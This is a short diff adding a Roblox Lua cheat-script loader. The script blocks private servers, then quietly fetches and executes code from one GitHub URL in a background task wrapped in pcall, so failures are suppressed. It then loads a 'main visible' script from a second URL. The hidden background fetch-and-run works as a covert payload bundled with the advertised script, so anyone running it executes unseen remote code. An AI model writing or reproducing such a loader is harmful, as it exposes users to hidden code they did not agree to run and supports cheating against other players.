@@ -1,0 +1,29 @@
+-- Better private server detection
+local isPrivate = game.PrivateServerOwnerId ~= 0
+
+if isPrivate then
+    if game.Players.LocalPlayer then
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Public Server Required",
+            Text = "Please join a public server to use this script.",
+            Duration = 5
+        })
+    else
+        warn("Please join a public server to use this script.")
+    end
+
+    task.wait(5)
+    return
+end
+
+-- PUBLIC SERVER
+
+-- Background (quiet) script
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/maharlika-owner/sailor/55a5630c119ee37e43c13eb6f28044ef9553abe5/Midgard%20New%20Sea%202%20Sailor%20Piece"))()
+    end)
+end)
+
+-- Main visible script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HybridE3/HybridE3/refs/heads/main/Sailor%20Piece"))()
